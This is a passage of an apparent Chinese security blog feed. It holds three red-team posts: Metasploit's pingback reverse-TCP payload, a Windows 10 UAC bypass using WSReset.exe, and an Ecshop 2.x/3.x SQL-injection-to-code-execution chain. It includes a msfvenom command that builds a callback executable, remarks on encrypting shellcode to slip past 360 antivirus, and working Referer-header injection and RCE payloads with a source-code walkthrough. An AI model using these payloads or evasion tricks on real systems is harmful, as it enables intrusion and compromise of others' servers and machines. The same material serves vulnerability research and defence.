class="string">'m0'</span>)&#125;</span>'.unpack('m0');"</span></span><br><span class="line">      <span class="string">"c.close"</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/base/sessions/pingback.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid_read</span></span></span><br><span class="line">    uuid_raw = rstream.get_once(<span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> uuid_raw</span><br><span class="line">    <span class="keyword">self</span>.uuid_string = uuid_raw.each_byte.map &#123; <span class="params">|b|</span> <span class="string">"%02x"</span> % b.to_i() &#125;.join</span><br><span class="line">    print_status(<span class="string">"Incoming UUID = <span class="subst">#&#123;uuid_string&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> framework.db.active</span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        payload = framework.db.payloads(<span class="symbol">uuid:</span> uuid_string).first</span><br><span class="line">        <span class="keyword">if</span> payload.<span class="literal">nil</span>?</span><br><span class="line">          print_warning(<span class="string">"Provided UUID (<span class="subst">#&#123;uuid_string&#125;</span>) was not found in database!"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          print_good(<span class="string">"UUID identified (<span class="subst">#&#123;uuid_string&#125;</span>)"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> ActiveRecord::ConnectionNotEstablished</span><br><span class="line">        print_status(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">      <span class="keyword">rescue</span> =&gt; e</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Can we have a more specific exception handler?</span></span><br><span class="line">        <span class="comment"># Test: what if we send no bytes back?  What if we send less than 16 bytes?  Or more than?</span></span><br><span class="line">        elog(<span class="string">"Can't get original UUID"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Class: <span class="subst">#&#123;e.<span class="keyword">class</span>.name&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Message: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Backtrace: <span class="subst">#&#123;e.backtrace&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_warning(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后在 <code>option.rb</code> 中，我们能看到pingback的模块存在两个选项：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackRetries'</span>, [<span class="literal">true</span>, <span class="string">"How many additional successful pingbacks"</span>, <span class="number">0</span>]),</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackSleep'</span>, [<span class="literal">true</span>, <span class="string">"Time (in seconds) to sleep between pingbacks"</span>, <span class="number">30</span>])</span><br><span class="line">      ], <span class="keyword">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><ul><li>PingbackRetries  - pingback的次数</li><li>PingbackSleep - pinigback的时间间隔</li></ul><p>我们利用 <code>Msfvenom</code> 生成一个 <code>windows/x64/pingback_reverse_tcp</code> 的exe木马</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/pingback_reverse_tcp -f exe -o patrilic.exe LHOST=<span class="number">192.168</span>.<span class="number">1.107</span> LPORT=<span class="number">4445</span> EXITFUNC=thread PINGBACKRETRIES=<span class="number">10</span> PINGBACKSLEEP=<span class="number">5</span></span><br></pre></td></tr></table></figure><p>然后在目标机器上执行时：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698698752-8e60bbfb-8134-4cae-a909-80499d4ab5c2.png" alt="image.png"><br>只会返回UUID<br><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698945771-f65f647a-3285-42e1-863e-29555f64cca5.png" alt="image.png"></p><p>然后目标机器上并没有产生任何的交互式shell，同时使用 <code>Wireshark</code> 也只能捕获到16byte的UUID值</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567699063357-40b97628-fdfa-4c67-951a-546ce62b1f6e.png" alt="image.png"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这次更新的pingback payload，已经感觉是最小化的攻击载荷了，而且特征也并不明显，只是一串随机的UUID值而已，感觉用来验证漏洞还是挺不错的，然后后面再办法去掉exp特征，使用另外的方式来获得交互式shell或者直接执行命令云云.. 当然，msf直接生成的程序特征还是挺明显的，还是需要进行免杀，不过由于这个payload并没有进行起敏感进程，所以还是比较好免杀的。</p><p>shellcode随便加密搞了下，静态还行，但是动态估计也没啥2333毕竟也没有危险进程，只是开了个socket</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701851264-0e1de3de-9aec-49dd-99cc-278ba2685e22.png#align=left&amp;display=inline&amp;height=937&amp;name=image.png&amp;originHeight=1874&amp;originWidth=3358&amp;size=497343&amp;status=done&amp;width=1679" alt="image.png"></p><p>然后进程开起来的话，找了个360的机子试了下，没啥问题</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701981644-609e99b8-e943-4859-96fb-00c8d6ffa46e.png" alt="image1.png"></p><p>不过特征估计也快普及了，感觉思路挺好的，学习了～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a name=&quot;JSO7R&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;文章首发于先知社区
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="metasploit" scheme="http://patrilic.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Windows10 BypassUAC with WSReset.exe</title>
    <link href="http://patrilic.top/2019/08/29/Windows10%20BypassUAC%20with%20WSReset.exe/"/>
    <id>http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/</id>
    <published>2019-08-29T15:51:00.000Z</published>
    <updated>2019-08-30T00:49:55.667Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>Time: 2019-08-29 23:51:00<br><img src="/wallpaper/63740442.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><a href="https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html" target="_blank" rel="noopener">https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html</a></p><p>利用<code>WSReset.exe</code>进行bypassUAC。</p><p>为什么只限于Win10呢，因为这个位于<code>C:\WINDWOS\System32</code> 目录下的程序，是微软商店的一个工具<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/E969032A-4448-40D0-9389-395E1D9502AA.png" alt="6f262c0c97c3dfb682f04fd809cf60e3"></p><h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a>0x01 Bypass</h2><p>这里原作者自己编写了脚本和工具：<br><a href="https://github.com/sailay1996/UAC_bypass_windows_store" target="_blank" rel="noopener">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>首先使用<code>UAC.bat</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/CB964BB5-BB3A-4D53-A67C-6E6454849741.png" alt="ec35f36d2e88012ed02af35cbc09e1f0"></p><p>创建一个带空格字符的目录，然后把WSReset扔进去</p><p>接着运行<code>uac_bypass.exe</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/8FF6C343-6736-4498-A988-5766929E0EFD.png" alt="c4add2018e585c2ca68544c6acabb04e"></p><p>调用DLL，弹出对话框<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/A6D6CAA5-A74F-4965-B791-F1E7FCDDC7B7.png" alt="605ad7a9df01dc55e5392b562a029677"><br>主要就是因为这个👉<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/32B27C2A-82C9-4934-9CCD-3051DBEAC8A7.png" alt="589206bf8c6b67a17a09253985b8e353"></p><p>然后会弹出一个管理员的CMD<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/B375540E-97FA-4751-8A24-9A0385A5341F.png" alt="4c6538e20548f14902cfd64df18f0cb6"></p><p>但是有一个问题是，虚拟机一直保持高速下载<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/92007680-2629-45ED-AE96-E6C8863511D2.png" alt="f1748df2675213d7fa216762acb9be4c"></p><p>感觉程序里有些东西..后面无聊再分析吧。</p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>bypassUAC方法多种多样，看这个只是因为好玩，用微软没啥用的应用商店的组件，其实本质上还是DLL劫持2333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;Time: 2019-08-29 23:51:00&lt;br&gt;&lt;img src=&quot;/wallpaper/63740442.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;
      
    
    </summary>
    
      <category term="BypassUac" scheme="http://patrilic.top/categories/BypassUac/"/>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop 2.x/3.x SQL注入 + 代码执行</title>
    <link href="http://patrilic.top/2019/08/27/Ecshop%202.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/08/27/Ecshop 2.x 代码执行/</id>
    <published>2019-08-26T16:03:02.000Z</published>
    <updated>2019-08-27T18:00:58.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-27 00:03:02<br><img src="/wallpaper/[60268880.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很多QB的Passer6y给我发了个长得奇奇怪怪的payload，想了下，好像是Ecshop 2.x的RCE，昨年看到就想分析，一直搞忘了.. 今晚补上！<br>PS: 速度与激情真的好看，Dwayne Johnson太帅ahhhh</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>使用phpstudy 2018 搭建</p><blockquote><p>分析工具： PhpStorm<br>php 5.3.29 nts + Apache<br>MySQL 5.5.3</p></blockquote><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>漏洞发生在user.php 的 Referer处<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">72</span>:<span class="string">"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x 代码执行.resources/0BD49A51-AEE2-4D13-A91A-9313BB129B0C.png" alt="e21d6b60329ce5b0f5a9129ba3da49b6"></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>其实是SQL注入的进一步利用，同样是在user.php<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x 代码执行.resources/AF83B1F8-8389-4E44-AB11-AE46841695E0.png" alt="63cf020521a24682a91cb6aae5e91fbb"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><p>直接看漏洞发生点：<br>既然payload是从Referer传进来的，那么就直接看<code>[&#39;HTTP_REFERER&#39;]</code><br><strong>user.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 用户登录界面 */</span></span><br><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$back_act</code> 从<code>HTTP_REFERER</code>那里拿到值，然后<code>$smarty-&gt;assign(&#39;back_act&#39;, $back_act);</code><br>将<code>$back_act</code>作为参数，调用<code>assign</code>函数<br><img src="/Ecshop 2.x 代码执行.resources/AE65DFBE-6628-45D3-9296-922A907441D6.png" alt="754c7a3810743fdf7d2cf06aeea33529"><br>实际调用的是<code>/includes/cls_template.php</code>下的<code>assign</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以其实是注册了模板变量，然后回到login处，调用了display函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">        $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">            <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>filename便是传入的<code>user_passport.dwt</code>，这里调用fetch处理dwt文件，转到fetch函数，使用了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</span><br></pre></td></tr></table></figure></p><p>然后使用make_compiled函数进行编译<br><code>user_passport.dwt</code>里面存在{$back_act}变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align=<span class="string">"left"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"act"</span> value=<span class="string">"act_login"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"back_act"</span> value=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span><br><span class="line">&lt;input type="submit" name="submit" value="" class="us_Submit" /&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p><p>display函数里存在一个if判断，如果<code>$out</code>是否存在<code>$this-&gt;_echash</code>，而这个hash值，其实是一个静态变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $_echash = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br></pre></td></tr></table></figure></p><p>我们跟进这个if判断，如果存在的话，从hash处分割，然后把<code>$k</code>交给<code>$this-&gt;insert_mod($val)</code>去处理<br>继续跟<code>insert_mod()</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">        $para = unserialize($para);</span><br><span class="line">        $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $fun($para);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里先用<code>|</code>分割，进行反序列化操作，然后再使用<code>insert_</code>拼接，所以其实，该函数名和参数均可控<br>就是需要寻找一个<code>insert_</code>开头的函数。</p><p>最后，<code>/includes/lib_insert.php</code>里存在一个<code>insert_ads</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($static_res[$arr[<span class="string">'id'</span>]] === <span class="keyword">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span>.</span><br><span class="line">                        <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                    <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] .</span><br><span class="line">                        <span class="string">"' AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span> .</span><br><span class="line">                    <span class="string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="string">'id'</span>]] = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        $res = $static_res[$arr[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里我们的<code>$arr</code>数组，是完全可控的，就造成了一个SQL注入漏洞<br>所以攻击链就出来了</p><blockquote><p>user.php （获取$back_act）-&gt; assign() 注册变量 -&gt; display() 输出模版 -&gt; 根据hash，进入insert_mod() -&gt; 最后调用insert_ads() 完成注入</p></blockquote><p>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REFERER: hash + $fun | serialize(<span class="keyword">array</span>(<span class="string">"num"</span>=&gt;sqlpayload,<span class="string">"id"</span>=&gt;<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p><h3 id="代码执行-1"><a href="#代码执行-1" class="headerlink" title="代码执行"></a>代码执行</h3><p>漏洞点同样是这个SQL注入引起，主要是因为<code>insert_ads()</code>函数后面又引入了一个fetch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span 